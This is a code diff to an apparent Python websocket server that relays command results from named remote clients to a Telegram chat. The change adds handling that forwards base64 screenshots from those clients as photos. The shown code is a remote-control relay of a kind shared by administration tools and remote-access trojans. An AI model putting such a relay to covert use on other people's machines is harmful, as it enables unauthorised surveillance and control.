@@ -82,8 +82,28 @@ async def ws_handler(request: web.Request):
                 add_history("client", name, cmd, result)
                 log.info(f"[result] {name}: {cmd!r} → {result[:80]!r}")
                 if "reply_chat_id" in data:
-                    await send_tg(data["reply_chat_id"],
-                                  f"✅ *{name}* › `{cmd}`\n```\n{result[:3000]}\n```")
+                    chat_id = data["reply_chat_id"]
+                    # Screenshot base64 — send as photo directly to Telegram
+                    if result.startswith("[SCREENSHOT_B64]"):
+                        try:
+                            import base64, io as _sio
+                            lines  = result.split("\n", 2)
+                            dims   = lines[0].replace("[SCREENSHOT_B64]", "").strip()
+                            b64    = lines[2] if len(lines) > 2 else lines[1]
+                            raw    = base64.b64decode(b64)
+                            buf    = _sio.BytesIO(raw)
+                            buf.name = "screenshot.png"
+                            await _app.bot.send_photo(
+                                chat_id=chat_id,
+                                photo=buf,
+                                caption=f"📸 *{name}* — {dims}",
+                                parse_mode="Markdown",
+                            )
+                        except Exception as e:
+                            await send_tg(chat_id, f"📸 Screenshot taken but failed to send as photo: {e}")
+                    else:
+                        await send_tg(chat_id,
+                                      f"✅ *{name}* › `{cmd}`\n```\n{result[:3000]}\n```")
 
             elif kind == "ping":
                 if name: clients[name]["last_seen"] = now_str()
